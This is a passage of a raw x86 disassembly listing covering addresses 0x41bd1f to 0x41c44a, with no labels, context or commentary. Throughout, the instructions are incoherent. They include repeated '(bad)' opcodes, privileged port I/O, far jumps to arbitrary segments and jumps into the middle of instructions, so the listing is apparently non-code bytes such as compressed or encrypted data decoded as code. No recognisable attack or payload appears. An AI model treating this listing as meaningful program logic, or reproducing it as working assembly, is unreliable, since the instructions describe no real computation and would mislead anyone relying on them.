  41bd1f:	retf   
  41bd20:	and    dh,0x9c
  41bd23:	mov    esi,0xd8ae45b9
  41bd28:	fstp   TBYTE PTR [ecx-0x4472e03c]
  41bd2e:	pop    esp
  41bd2f:	xor    esp,ebx
  41bd31:	daa    
  41bd32:	and    BYTE PTR [edi],dh
  41bd34:	outs   dx,DWORD PTR ds:[esi]
  41bd35:	cld    
  41bd36:	imul   DWORD PTR ds:[esi-0x38]
  41bd3a:	test   eax,0x18da7a1b
  41bd3f:	mov    dh,0x19
  41bd41:	add    al,0x57
  41bd43:	dec    ebx
  41bd44:	mov    edx,ebp
  41bd46:	cdq    
  41bd47:	(bad)  
  41bd48:	fsubr  DWORD PTR [eax+0x3354d26]
  41bd4e:	test   DWORD PTR [ecx],edi
  41bd50:	jge    0x41bd9d
  41bd52:	lahf   
  41bd53:	fdiv   st,st(0)
  41bd55:	or     eax,0xeef6f11d
  41bd5a:	inc    ecx
  41bd5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd5c:	jl     0x41bdb2
  41bd5e:	xchg   ebp,eax
  41bd5f:	inc    ebp
  41bd60:	out    dx,eax
  41bd61:	jg     0x41bcea
  41bd63:	jb     0x41bd1d
  41bd65:	jmp    0x4c814ac
  41bd6a:	and    eax,0x8dfaeb90
  41bd6f:	and    BYTE PTR [esi+0x26],bl
  41bd72:	xchg   BYTE PTR [esi-0x29],al
  41bd75:	mov    BYTE PTR [edi],dh
  41bd77:	sahf   
  41bd78:	shl    DWORD PTR [ebp-0x25],cl
  41bd7b:	sbb    DWORD PTR [edx],edi
  41bd7d:	or     DWORD PTR [eax+0x354f509f],eax
  41bd83:	jno    0x41bdeb
  41bd85:	addr16 mov ebp,0x2aee0631
  41bd8b:	pop    edi
  41bd8c:	jecxz  0x41bdf7
  41bd8e:	or     al,0x2e
  41bd90:	dec    DWORD PTR [eax-0x99a7c28]
  41bd96:	adc    DWORD PTR [ebx],ebx
  41bd98:	jae    0x41be0a
  41bd9a:	out    dx,eax
  41bd9b:	mov    ah,0x19
  41bd9d:	push   eax
  41bd9e:	out    0xd8,eax
  41bda0:	pop    ebp
  41bda1:	in     al,0x90
  41bda3:	in     al,0xc8
  41bda5:	adc    dh,BYTE PTR [esi-0x25]
  41bda8:	xor    DWORD PTR [ecx],esi
  41bdaa:	or     BYTE PTR [edi],dh
  41bdac:	dec    esi
  41bdad:	int3   
  41bdae:	xor    DWORD PTR [esi+eax*1],ebx
  41bdb1:	ja     0x41bd38
  41bdb3:	sbb    al,0x9c
  41bdb5:	add    BYTE PTR [esi],ah
  41bdb7:	ins    BYTE PTR es:[edi],dx
  41bdb8:	js     0x41bd7f
  41bdba:	dec    eax
  41bdbb:	mov    ch,0xfb
  41bdbd:	push   ecx
  41bdbe:	(bad)  
  41bdbf:	xor    edi,edi
  41bdc1:	scas   al,BYTE PTR es:[edi]
  41bdc2:	push   esp
  41bdc3:	pushf  
  41bdc4:	xchg   edx,eax
  41bdc5:	cmc    
  41bdc6:	std    
  41bdc7:	stos   BYTE PTR es:[edi],al
  41bdc8:	xchg   esp,eax
  41bdc9:	adc    ebp,DWORD PTR [edx+0x995bd58]
  41bdcf:	push   es
  41bdd0:	sbb    eax,DWORD PTR [ecx]
  41bdd2:	mov    eax,ds:0x40595951
  41bdd7:	jae    0x41be17
  41bdd9:	mov    al,0xe7
  41bddb:	xor    DWORD PTR [eax-0x71],ebx
  41bdde:	ss adc al,0x1
  41bde1:	outs   dx,BYTE PTR ds:[esi]
  41bde2:	out    dx,eax
  41bde3:	jg     0x41bdc8
  41bde5:	dec    esi
  41bde6:	push   edx
  41bde7:	mov    edi,0xf60b165
  41bdec:	and    eax,0xc02bba81
  41bdf1:	mov    esp,0xe1fbfe71
  41bdf6:	dec    ebp
  41bdf7:	ja     0x41be50
  41bdf9:	adc    dl,BYTE PTR [esi]
  41bdfb:	and    eax,0x47b3fd70
  41be00:	leave  
  41be01:	xchg   ch,cl
  41be03:	pushf  
  41be04:	enter  0xd1a8,0xdb
  41be08:	fwait
  41be09:	test   BYTE PTR [edx],dl
  41be0b:	enter  0xb2f6,0xf5
  41be0f:	push   0x914e7d3a
  41be14:	scas   al,BYTE PTR es:[edi]
  41be15:	xchg   esp,eax
  41be16:	bound  ebx,QWORD PTR [edx]
  41be18:	jb     0x41be0a
  41be1a:	push   0xd306e6e9
  41be1f:	call   0x2f23:0x4fcf9e19
  41be26:	in     eax,dx
  41be27:	out    dx,eax
  41be28:	(bad)  
  41be29:	xchg   esp,eax
  41be2a:	mov    esp,0x86fd1652
  41be2f:	or     DWORD PTR [edi],ecx
  41be31:	rcl    BYTE PTR [eax-0x43fd03e],1
  41be37:	mov    bl,0x1e
  41be39:	mov    ecx,0x22670d21
  41be3e:	push   esi
  41be3f:	das    
  41be40:	push   0xffffffaa
  41be42:	fs (bad) 
  41be45:	add    eax,DWORD PTR [edx]
  41be47:	scas   eax,DWORD PTR es:[edi]
  41be48:	lahf   
  41be49:	dec    esi
  41be4a:	jb     0x41bea5
  41be4c:	mov    BYTE PTR [eax+ebx*8-0x35],ch
  41be50:	lahf   
  41be51:	cld    
  41be52:	(bad)  
  41be53:	(bad)  
  41be54:	jno    0x41be40
  41be56:	not    esi
  41be58:	lahf   
  41be59:	not    DWORD PTR [ebx-0x5323d230]
  41be5f:	repz or al,0x53
  41be62:	fld    st(3)
  41be64:	fbstp  TBYTE PTR [edi+0x40]
  41be67:	je     0x41be66
  41be69:	inc    esp
  41be6a:	dec    esp
  41be6b:	mul    edi
  41be6d:	aam    0x13
  41be6f:	xchg   edi,eax
  41be70:	and    dl,BYTE PTR [edi+0x72]
  41be73:	cmc    
  41be74:	or     DWORD PTR [ebp-0x5fd99b7c],esi
  41be7a:	jmp    0x41bef9
  41be7c:	pop    esi
  41be7d:	aad    0x46
  41be7f:	inc    edi
  41be80:	dec    esp
  41be81:	mov    ebx,0xf8f29506
  41be86:	daa    
  41be87:	add    esp,DWORD PTR [ebx]
  41be89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be8a:	(bad)  [eax]
  41be8c:	mov    edx,0xdc5285a
  41be91:	xchg   esi,eax
  41be92:	in     eax,dx
  41be93:	in     eax,dx
  41be94:	(bad)  
  41be95:	ins    BYTE PTR es:[edi],dx
  41be96:	dec    eax
  41be97:	loopne 0x41bf0a
  41be99:	rcr    BYTE PTR [ecx+0x3c],cl
  41be9c:	sub    DWORD PTR [ecx+0x7e],0xffffffe5
  41bea0:	adc    esp,DWORD PTR [edi+0x6c238a31]
  41bea6:	xchg   esi,eax
  41bea7:	mov    edi,0x11950981
  41beac:	inc    esp
  41bead:	iret   
  41beae:	ret    0xa05f
  41beb1:	dec    esp
  41beb2:	xor    DWORD PTR [edx-0x6d],ebp
  41beb5:	push   ss
  41beb6:	std    
  41beb7:	shr    DWORD PTR [eax-0x1a95c5e8],1
  41bebd:	sti    
  41bebe:	jb     0x41bf08
  41bec0:	shl    BYTE PTR [eax-0x5c2fa5ab],0x34
  41bec7:	sbb    esi,DWORD PTR [ecx-0x3db29011]
  41becd:	add    eax,edx
  41becf:	push   ss
  41bed0:	repz (bad) 
  41bed3:	or     BYTE PTR ds:0xf5b2ca17,dh
  41bed9:	ss jg  0x41befe
  41bedc:	sti    
  41bedd:	in     eax,dx
  41bede:	push   ecx
  41bedf:	aas    
  41bee0:	bound  edi,QWORD PTR [ecx]
  41bee2:	mov    edx,0x36c0e9f2
  41bee7:	(bad)  
  41bee8:	pop    ebp
  41bee9:	enter  0x31d0,0xf0
  41beed:	cwde   
  41beee:	lahf   
  41beef:	adc    ebp,esp
  41bef1:	pop    esi
  41bef2:	mov    dh,0x45
  41bef4:	adc    edx,DWORD PTR [edx]
  41bef6:	pop    ds
  41bef7:	lock or esp,DWORD PTR [ebx]
  41befa:	dec    ebp
  41befb:	pop    edx
  41befc:	stos   BYTE PTR es:[edi],al
  41befd:	fwait
  41befe:	ins    BYTE PTR es:[edi],dx
  41beff:	nop
  41bf00:	imul   ecx,DWORD PTR [ebp+0x58d6d7f8],0x91d6e204
  41bf0a:	mov    al,ds:0x8020798f
  41bf0f:	icebp  
  41bf10:	mov    ebp,0x6ec3bf4d
  41bf15:	jbe    0x41beaf
  41bf17:	test   edi,ecx
  41bf19:	(bad)  
  41bf1b:	jge    0x41bf08
  41bf1d:	loop   0x41bf12
  41bf1f:	hlt    
  41bf20:	add    eax,0xd2767903
  41bf25:	scas   eax,DWORD PTR es:[edi]
  41bf26:	ins    DWORD PTR es:[edi],dx
  41bf27:	in     al,dx
  41bf28:	adc    cl,BYTE PTR [edx+0x4d]
  41bf2b:	mov    dh,bl
  41bf2d:	push   ds
  41bf2e:	mov    eax,0xb74d5255
  41bf33:	push   edx
  41bf34:	in     al,dx
  41bf35:	ins    BYTE PTR es:[edi],dx
  41bf36:	jp     0x41bf7f
  41bf38:	push   ss
  41bf39:	mov    ah,0x4
  41bf3b:	fwait
  41bf3c:	push   esp
  41bf3d:	cmp    DWORD PTR [ebp-0x6ddbe2d7],esi
  41bf43:	retf   
  41bf44:	mov    BYTE PTR [ecx-0x38],ch
  41bf47:	xchg   DWORD PTR [ebp+0x65b818e1],esp
  41bf4d:	das    
  41bf4e:	cwde   
  41bf4f:	enter  0x473a,0x2f
  41bf53:	jne    0x41bf65
  41bf55:	or     bh,cl
  41bf57:	fisub  DWORD PTR [esi+0x78]
  41bf5a:	mov    DWORD PTR [eax+0x70],ecx
  41bf5d:	mov    bl,0xa5
  41bf5f:	mov    al,ds:0xad2524dc
  41bf64:	sub    cl,al
  41bf66:	pop    es
  41bf67:	and    dl,BYTE PTR [ecx+0x13]
  41bf6a:	repz imul ebx,DWORD PTR [edx+0x7a39b0aa],0x3cb091a7
  41bf75:	mov    BYTE PTR [esi+0x1a],bl
  41bf78:	jb     0x41bf01
  41bf7a:	pop    ebx
  41bf7b:	mov    dh,BYTE PTR [edi-0x49d7dc8b]
  41bf81:	sub    al,0xf4
  41bf83:	retf   0x6270
  41bf86:	(bad)  
  41bf87:	ficomp WORD PTR [edi+0x6e]
  41bf8a:	push   esp
  41bf8b:	mov    fs,eax
  41bf8d:	adc    BYTE PTR [ecx-0x3a],al
  41bf90:	add    cl,BYTE PTR ds:0x11e6a192
  41bf96:	or     DWORD PTR [esp+edi*4],ebp
  41bf99:	(bad)  
  41bf9a:	fs in  al,dx
  41bf9c:	loope  0x41bf37
  41bf9e:	push   esp
  41bf9f:	pop    esi
  41bfa0:	out    dx,al
  41bfa1:	jmp    0x22d6:0xb91108a
  41bfa8:	pop    ebp
  41bfa9:	leave  
  41bfaa:	push   ecx
  41bfab:	jg     0x41c008
  41bfad:	sar    DWORD PTR [ecx+esi*2+0x4c81b19a],1
  41bfb4:	push   ebp
  41bfb5:	lock jnp 0x41bfa7
  41bfb8:	pop    ebp
  41bfb9:	push   ecx
  41bfba:	pop    ss
  41bfbb:	jmp    0x8bf29c8c
  41bfc0:	iret   
  41bfc1:	(bad)  
  41bfc2:	mov    ds:0x19641f3f,al
  41bfc7:	inc    edi
  41bfc8:	jmp    0x41bfdc
  41bfca:	lods   al,BYTE PTR ds:[esi]
  41bfcb:	mov    eax,ds:0x3ce228f5
  41bfd0:	fild   DWORD PTR [esi-0x10c5ac6b]
  41bfd6:	xchg   ebx,eax
  41bfd7:	sahf   
  41bfd8:	pop    ebx
  41bfd9:	or     BYTE PTR [ebx+0x26],0x35
  41bfdd:	pop    ecx
  41bfde:	pop    eax
  41bfdf:	bound  esp,QWORD PTR [ebx]
  41bfe1:	je     0x41bfe1
  41bfe3:	xor    cl,BYTE PTR [ebp+0x62]
  41bfe6:	jmp    0x41bf6b
  41bfe8:	outs   dx,BYTE PTR ds:[esi]
  41bfe9:	dec    ebp
  41bfea:	xchg   DWORD PTR [esi+0x55],esi
  41bfed:	fwait
  41bfee:	xor    ah,BYTE PTR [ebx+0x111a3e93]
  41bff4:	leave  
  41bff5:	(bad)  
  41bff6:	sbb    eax,0xd746393d
  41bffb:	xchg   DWORD PTR [ecx],esp
  41bffd:	jno    0x41c061
  41bfff:	leave  
  41c000:	pop    eax
  41c001:	push   ecx
  41c002:	loopne 0x41c057
  41c004:	add    DWORD PTR [esi+0x49],edi
  41c007:	mov    edx,0xf8ad4fe4
  41c00c:	dec    edi
  41c00d:	mov    esp,0xad2d3b75
  41c012:	jmp    0xf96c9902
  41c017:	adc    ah,bl
  41c019:	mov    eax,ds:0x9b7d49f1
  41c01e:	fidivr WORD PTR [edx+0xf]
  41c021:	xor    bh,BYTE PTR [ebx-0x70936ed3]
  41c027:	sbb    DWORD PTR [ecx],0x78
  41c02a:	jle    0x41c051
  41c02c:	popw   es
  41c02e:	mov    bl,0x33
  41c030:	in     al,0xb0
  41c032:	pop    edi
  41c033:	(bad)  
  41c034:	(bad)  
  41c035:	mov    edi,0x917247fe
  41c03a:	leave  
  41c03b:	mov    esp,0x509ba8fb
  41c040:	adc    DWORD PTR [edx+0x3],esi
  41c043:	pop    ss
  41c044:	(bad)  
  41c045:	and    BYTE PTR [edx-0x450dbf35],bl
  41c04b:	test   al,0xbf
  41c04d:	push   edx
  41c04e:	call   0x567274cc
  41c053:	or     esp,0x21db65c6
  41c059:	sbb    al,0xc8
  41c05b:	arpl   WORD PTR [edx+ecx*4-0xf38a7ff],bx
  41c062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c063:	es loopne 0x41c08c
  41c066:	push   eax
  41c067:	rol    cl,cl
  41c069:	and    ch,BYTE PTR [edx]
  41c06b:	pop    es
  41c06c:	jge    0x41c078
  41c06e:	in     al,dx
  41c06f:	add    dh,BYTE PTR [esi]
  41c071:	data16 (bad) 
  41c073:	out    0x52,al
  41c075:	jle    0x41c0ab
  41c077:	jg     0x41c0e1
  41c079:	(bad)  
  41c07a:	sub    esp,DWORD PTR [esi]
  41c07c:	pop    ecx
  41c07d:	dec    ecx
  41c07e:	outs   dx,BYTE PTR ds:[esi]
  41c07f:	sbb    dh,BYTE PTR [edi-0x6]
  41c082:	aaa    
  41c083:	in     eax,0x2f
  41c085:	ret    
  41c086:	std    
  41c087:	cmp    al,0x42
  41c089:	scas   al,BYTE PTR es:[edi]
  41c08a:	outs   dx,BYTE PTR ds:[esi]
  41c08b:	cmp    ebp,DWORD PTR [edi+0x1f490798]
  41c091:	mov    esp,esp
  41c093:	mov    bl,0xc5
  41c095:	dec    edi
  41c096:	popf   
  41c097:	xor    DWORD PTR [edx+0x6a],esp
  41c09a:	or     al,0xa1
  41c09c:	stc    
  41c09d:	mov    al,0xd4
  41c09f:	leave  
  41c0a0:	shl    DWORD PTR [ebx+esi*2],1
  41c0a3:	lock add esi,DWORD PTR [edi]
  41c0a6:	pop    eax
  41c0a7:	dec    esi
  41c0a8:	call   DWORD PTR [edx-0x8d90882]
  41c0ae:	sub    edi,DWORD PTR [ebp+0x51943adf]
  41c0b4:	ret    
  41c0b5:	dec    esp
  41c0b6:	(bad)  
  41c0b7:	retf   0x2cb6
  41c0ba:	dec    ecx
  41c0bb:	pushf  
  41c0bc:	inc    edx
  41c0bd:	mov    esi,0x39ef6ad0
  41c0c2:	scas   al,BYTE PTR es:[edi]
  41c0c3:	mov    DWORD PTR [edi-0x728b097f],ecx
  41c0c9:	xchg   BYTE PTR [ebx-0x27268d7b],ah
  41c0cf:	les    ebx,FWORD PTR [edi-0x34]
  41c0d2:	fs cdq 
  41c0d4:	mov    BYTE PTR [esi+0x724d2a76],bh
  41c0da:	or     ecx,DWORD PTR [ecx+edx*8-0x76]
  41c0de:	pop    es
  41c0df:	(bad)  [ebp-0x58a93925]
  41c0e5:	jle    0x41c0ad
  41c0e7:	lahf   
  41c0e8:	mov    DWORD PTR ds:[ebx-0x1a],edi
  41c0ec:	shl    BYTE PTR [ecx+eax*2+0x185a2e2b],1
  41c0f3:	into   
  41c0f4:	jno    0x41c0a6
  41c0f6:	(bad)  
  41c0f7:	stc    
  41c0f8:	mov    edi,0xd6ecc73d
  41c0fd:	scas   eax,DWORD PTR es:[edi]
  41c0fe:	clc    
  41c0ff:	xlat   BYTE PTR gs:[ebx]
  41c101:	ins    BYTE PTR es:[edi],dx
  41c102:	imul   ecx,DWORD PTR [esi+0x29],0x2b
  41c106:	jmp    0x41c0df
  41c108:	rcl    BYTE PTR [eax],1
  41c10a:	fist   WORD PTR [ebx]
  41c10c:	cmp    al,bh
  41c10e:	popa   
  41c10f:	sub    BYTE PTR [esi],dl
  41c111:	aaa    
  41c112:	fwait
  41c113:	cmp    BYTE PTR [esi-0x219dcb43],dh
  41c119:	push   eax
  41c11a:	xor    DWORD PTR [edx+0x12f02c3f],0x29
  41c121:	xchg   BYTE PTR [eax-0x694ae3d5],dh
  41c127:	jle    0x41c101
  41c129:	mov    ch,0xb9
  41c12b:	sahf   
  41c12c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c12e:	(bad)  
  41c12f:	jnp    0x41c13b
  41c131:	xchg   BYTE PTR [eax],bl
  41c133:	jae    0x41c176
  41c135:	sahf   
  41c136:	add    dh,bh
  41c138:	out    0x77,al
  41c13a:	sbb    al,0x88
  41c13c:	push   ecx
  41c13d:	xchg   edi,eax
  41c13e:	out    dx,al
  41c13f:	sub    DWORD PTR [ecx+0x1f],ebx
  41c142:	in     eax,0xf9
  41c144:	(bad)  
  41c145:	xchg   esi,eax
  41c146:	ror    BYTE PTR [ebx-0x642a479f],1
  41c14c:	pop    esi
  41c14d:	(bad)  
  41c14e:	pop    edx
  41c14f:	enter  0x1b33,0xbb
  41c153:	out    0xeb,eax
  41c155:	js     0x41c119
  41c157:	mov    eax,0x9ac54fd4
  41c15c:	dec    ebp
  41c15d:	and    BYTE PTR [esi-0x36],bl
  41c160:	ss xchg ecx,eax
  41c162:	aaa    
  41c163:	mov    bl,0xec
  41c165:	inc    eax
  41c166:	inc    esp
  41c167:	repz jmp 0x41c12a
  41c16a:	sbb    eax,0x3bb89220
  41c16f:	std    
  41c170:	fiadd  DWORD PTR [edi-0x45a28398]
  41c176:	adc    al,0x3
  41c178:	pop    esi
  41c179:	mov    bh,0x85
  41c17b:	stos   BYTE PTR es:[edi],al
  41c17c:	mov    cl,0x1c
  41c17e:	mov    gs,WORD PTR [edi-0x79]
  41c181:	outs   dx,BYTE PTR ds:[esi]
  41c182:	push   0x21
  41c184:	cdq    
  41c185:	mov    DWORD PTR [ecx-0x51],eax
  41c188:	retf   
  41c189:	jnp    0x41c206
  41c18b:	outs   dx,DWORD PTR ds:[esi]
  41c18c:	loopne 0x41c1da
  41c18e:	fimul  DWORD PTR [ecx+0x25fb3074]
  41c194:	out    0x55,al
  41c196:	or     DWORD PTR [ebx+0x42],edi
  41c199:	and    al,0x24
  41c19b:	arpl   WORD PTR [eax],si
  41c19d:	mov    ecx,0x5e2cd28
  41c1a2:	jle    0x41c1c3
  41c1a4:	lods   eax,DWORD PTR ds:[esi]
  41c1a5:	nop
  41c1a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1a7:	add    al,0xcc
  41c1a9:	outs   dx,DWORD PTR ds:[esi]
  41c1aa:	sbb    dl,BYTE PTR [edx-0x2e]
  41c1ad:	mov    BYTE PTR [ebx],ch
  41c1af:	mul    bh
  41c1b1:	ins    DWORD PTR es:[edi],dx
  41c1b2:	inc    ebp
  41c1b3:	fwait
  41c1b4:	in     eax,dx
  41c1b5:	mov    es,WORD PTR [esi-0x7010b785]
  41c1bb:	in     al,dx
  41c1bc:	pop    eax
  41c1bd:	pop    eax
  41c1be:	push   ecx
  41c1bf:	pop    ecx
  41c1c0:	and    al,0x42
  41c1c2:	faddp  st(1),st
  41c1c4:	out    dx,eax
  41c1c5:	rol    BYTE PTR [ebx+0xd1fb455],cl
  41c1cb:	dec    ecx
  41c1cc:	xor    ecx,ebp
  41c1ce:	or     BYTE PTR [edi-0x29],bh
  41c1d1:	in     eax,dx
  41c1d2:	imul   edx,DWORD PTR [eax],0x43
  41c1d5:	test   al,0x85
  41c1d7:	mov    ebx,0xa8cbd183
  41c1dc:	sub    bl,bh
  41c1de:	ss lahf 
  41c1e0:	push   edx
  41c1e1:	xor    BYTE PTR ds:0x8c3c812a,bh
  41c1e7:	dec    edi
  41c1e8:	lods   eax,DWORD PTR ds:[esi]
  41c1e9:	fnstcw WORD PTR [esi-0x56]
  41c1ec:	push   edi
  41c1ed:	pushf  
  41c1ee:	(bad)
  41c1f1:	mov    cl,0xc2
  41c1f3:	retf   0x81a1
  41c1f6:	addr16 jae 0x41c1d8
  41c1f9:	js     0x41c196
  41c1fb:	sub    BYTE PTR [ecx],0x62
  41c1fe:	out    0xfb,eax
  41c200:	jnp    0x41c1ea
  41c202:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c203:	out    0xfa,eax
  41c205:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c206:	xchg   ecx,eax
  41c207:	addr16 stc 
  41c209:	das    
  41c20a:	jmp    0x41c232
  41c20c:	cmp    BYTE PTR [ecx+0x4b],dl
  41c20f:	xor    DWORD PTR [esi-0x64fc4787],esp
  41c215:	dec    eax
  41c216:	cmp    esp,DWORD PTR [ebp-0x1ddd65bd]
  41c21c:	xchg   esi,eax
  41c21d:	cld    
  41c21e:	sbb    esp,DWORD PTR [eax]
  41c220:	ins    DWORD PTR es:[edi],dx
  41c221:	mov    edx,0x7c303baf
  41c226:	adc    bh,0xff
  41c229:	mov    al,ds:0x1c9580be
  41c22e:	shl    BYTE PTR [eax+0x44],cl
  41c231:	cwd    
  41c233:	(bad)  
  41c234:	cmp    esp,ecx
  41c236:	dec    esp
  41c237:	repz dec ecx
  41c239:	cmp    eax,0x9584c06
  41c23e:	outs   dx,BYTE PTR ds:[esi]
  41c23f:	imul   esp
  41c241:	mov    eax,ss:0x10ad804c
  41c247:	and    eax,0xd7f93841
  41c24c:	jle    0x41c277
  41c24e:	mov    cl,0xa6
  41c250:	sar    BYTE PTR [edx+0x22fce2d5],cl
  41c256:	int    0x57
  41c258:	xchg   ebx,eax
  41c259:	rcr    DWORD PTR ds:0x9b91e35f,cl
  41c25f:	pop    esi
  41c260:	fiadd  DWORD PTR [ecx+0x22]
  41c263:	add    DWORD PTR [ebx+edx*4],edi
  41c266:	in     al,dx
  41c267:	sbb    eax,DWORD PTR [ecx+0x53]
  41c26a:	xchg   ebp,eax
  41c26b:	fisub  DWORD PTR [edi]
  41c26d:	mov    BYTE PTR [eax-0x60],0xfa
  41c271:	jo     0x41c254
  41c273:	ja     0x41c2e5
  41c275:	mov    ch,0x2e
  41c277:	gs jae 0x41c2b3
  41c27a:	jg     0x41c2b9
  41c27c:	and    cl,BYTE PTR [edi]
  41c27e:	xor    BYTE PTR [esi],bh
  41c280:	sar    DWORD PTR [edi-0x4054b7fe],0x5b
  41c287:	jg     0x41c28a
  41c289:	mov    al,ds:0x3a711e8e
  41c28e:	enter  0xab38,0x2d
  41c292:	sub    BYTE PTR [ebx],dl
  41c294:	retf   
  41c295:	rcl    cl,cl
  41c297:	fisub  DWORD PTR [edx+0x6ffda00d]
  41c29d:	ds jg  0x41c25f
  41c2a0:	shr    ah,cl
  41c2a2:	sbb    BYTE PTR [ecx+esi*1],dl
  41c2a5:	or     al,0x6
  41c2a7:	test   DWORD PTR [edx+ebx*8-0x1a],edx
  41c2ab:	sub    BYTE PTR [esi-0x50a0a13c],0x84
  41c2b2:	xor    eax,0x8ddc4962
  41c2b7:	sbb    BYTE PTR [eax-0x44],bl
  41c2ba:	push   es
  41c2bb:	mov    ch,0xb2
  41c2bd:	sub    DWORD PTR [esi-0x542bd8b7],edx
  41c2c3:	mov    ds:0x4458e52d,al
  41c2c8:	call   0xcd61e00a
  41c2cd:	fmul   QWORD PTR [eax]
  41c2cf:	lock jecxz 0x41c2bd
  41c2d2:	xchg   ebx,eax
  41c2d3:	sub    eax,0x9e98427a
  41c2d8:	jae    0x41c262
  41c2da:	dec    esi
  41c2db:	daa    
  41c2dc:	scas   al,BYTE PTR es:[edi]
  41c2dd:	call   0xde93:0x71efc64e
  41c2e4:	or     DWORD PTR [edx-0x3c3b6c4e],esp
  41c2ea:	and    DWORD PTR [eax],0x97107aa7
  41c2f0:	mov    ecx,0x937e2e0d
  41c2f5:	dec    edi
  41c2f6:	cmp    al,0x68
  41c2f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2f9:	push   ss
  41c2fa:	dec    ebp
  41c2fb:	jne    0x41c2b9
  41c2fd:	nop
  41c2fe:	mov    ds:0x86c9ba3,al
  41c303:	outs   dx,BYTE PTR ds:[esi]
  41c304:	jge    0x41c290
  41c306:	cld    
  41c307:	and    eax,0xeaad455e
  41c30c:	icebp  
  41c30d:	mov    ds:0x548542c8,eax
  41c312:	imul   edx,DWORD PTR [edx-0x416ec2b7],0x224c2501
  41c31c:	es cwde 
  41c31e:	js     0x41c39e
  41c320:	mov    edi,0x89d97a35
  41c325:	xor    cl,dl
  41c327:	xchg   BYTE PTR [ecx],ch
  41c329:	add    eax,0xe30a3027
  41c32e:	imul   eax,DWORD PTR ds:0xbc7bb6dc,0x2af51375
  41c338:	loope  0x41c399
  41c33a:	daa    
  41c33b:	dec    ebx
  41c33c:	xchg   ebp,eax
  41c33d:	sub    eax,0x88a0488f
  41c342:	ror    BYTE PTR [eax-0x28],cl
  41c345:	in     eax,dx
  41c346:	(bad)  
  41c347:	cwde   
  41c348:	fbstp  TBYTE PTR [edi+0x8]
  41c34b:	mov    DWORD PTR [edi+0x552e626],esp
  41c351:	mov    WORD PTR [ebp-0x9],?
  41c354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c355:	(bad)  
  41c356:	jmp    0x34e2:0x48126606
  41c35d:	ja     0x41c3aa
  41c35f:	mov    bh,0x67
  41c361:	push   ecx
  41c362:	nop
  41c363:	push   edi
  41c364:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c365:	mov    ?,WORD PTR [ebp-0x3c]
  41c368:	xchg   BYTE PTR [ebp+0x6c20d5ae],ah
  41c36e:	loopne 0x41c3ee
  41c370:	jl     0x41c3b8
  41c372:	fisub  DWORD PTR [esi*8-0x53608f1]
  41c379:	retf   
  41c37a:	dec    eax
  41c37b:	pop    ebx
  41c37c:	sahf   
  41c37d:	jp     0x41c3d5
  41c37f:	push   ds
  41c380:	and    BYTE PTR [edx+0x5620a8a8],0xfc
  41c387:	ret    
  41c388:	push   0xfffffff6
  41c38a:	lods   eax,DWORD PTR ds:[esi]
  41c38b:	adc    edi,DWORD PTR [ecx+0x6f36644d]
  41c391:	shr    DWORD PTR [edx+0x5c],1
  41c394:	cmp    esi,esi
  41c396:	aas    
  41c397:	mov    ecx,0xbae5d08e
  41c39c:	fisttp WORD PTR [ebx-0x2a6c38c5]
  41c3a2:	mov    cl,0x61
  41c3a4:	scas   eax,DWORD PTR es:[edi]
  41c3a5:	inc    ebx
  41c3a6:	adc    eax,0xffa76fb0
  41c3ab:	jge    0x41c3a9
  41c3ad:	icebp  
  41c3ae:	je     0x41c405
  41c3b0:	adc    ah,BYTE PTR [ebp+0x2045d600]
  41c3b6:	adc    BYTE PTR [ebx-0x4f6ce604],bh
  41c3bc:	mov    dl,0x5
  41c3be:	push   0x1cb296dd
  41c3c3:	int3   
  41c3c4:	sbb    DWORD PTR [ebp+0x22],eax
  41c3c7:	pop    ebx
  41c3c8:	xchg   ecx,eax
  41c3c9:	xor    DWORD PTR [ecx],ebx
  41c3cb:	fld    DWORD PTR [edi-0x6e]
  41c3ce:	cs jg  0x41c3b5
  41c3d1:	dec    esi
  41c3d2:	aaa    
  41c3d3:	outs   dx,DWORD PTR ds:[esi]
  41c3d4:	inc    esp
  41c3d5:	lods   eax,DWORD PTR ds:[esi]
  41c3d6:	lods   eax,DWORD PTR ds:[esi]
  41c3d7:	add    esi,esp
  41c3d9:	mov    eax,ds:0xe1fc9fe4
  41c3de:	and    esi,DWORD PTR [esi+edi*8-0x59c069e7]
  41c3e5:	mov    al,0x9a
  41c3e7:	sub    ch,dl
  41c3e9:	cmp    al,0xf8
  41c3eb:	rol    DWORD PTR [ebx*4-0x5123961b],cl
  41c3f2:	mov    al,0x46
  41c3f4:	pop    ds
  41c3f5:	pop    ebx
  41c3f6:	mov    cs,WORD PTR [ecx]
  41c3f8:	inc    ebx
  41c3f9:	mov    esi,0x8e441c3e
  41c3fe:	cwde   
  41c3ff:	std    
  41c400:	ja     0x41c3eb
  41c402:	mov    al,ds:0x77a8aa9
  41c407:	in     eax,dx
  41c408:	push   0x4fd4d399
  41c40d:	shl    BYTE PTR [esi+0x6a],cl
  41c410:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c411:	ins    DWORD PTR es:[edi],dx
  41c412:	add    BYTE PTR cs:[edi+0x23],ch
  41c416:	scas   al,BYTE PTR es:[edi]
  41c417:	not    BYTE PTR [edi+ecx*4]
  41c41a:	aas    
  41c41b:	mov    edi,0xc798745e
  41c420:	cli    
  41c421:	stos   BYTE PTR es:[edi],al
  41c422:	mov    esi,DWORD PTR [ebp-0x62]
  41c425:	and    al,0xed
  41c427:	adc    al,0x29
  41c429:	or     al,0x89
  41c42b:	lock icebp 
  41c42d:	adc    eax,0x14002d1e
  41c432:	(bad)  
  41c433:	sbb    dh,BYTE PTR [eax]
  41c435:	mov    esp,0x548f801d
  41c43a:	pop    esi
  41c43b:	xchg   esp,eax
  41c43c:	ins    BYTE PTR es:[edi],dx
  41c43d:	sahf   
  41c43e:	or     dh,BYTE PTR [ecx+0x1f]
  41c441:	and    eax,0x364ea18b
  41c446:	ins    DWORD PTR es:[edi],dx
  41c447:	in     eax,dx
  41c448:	loopne 0x41c41b
  41c44a:	pop    esi
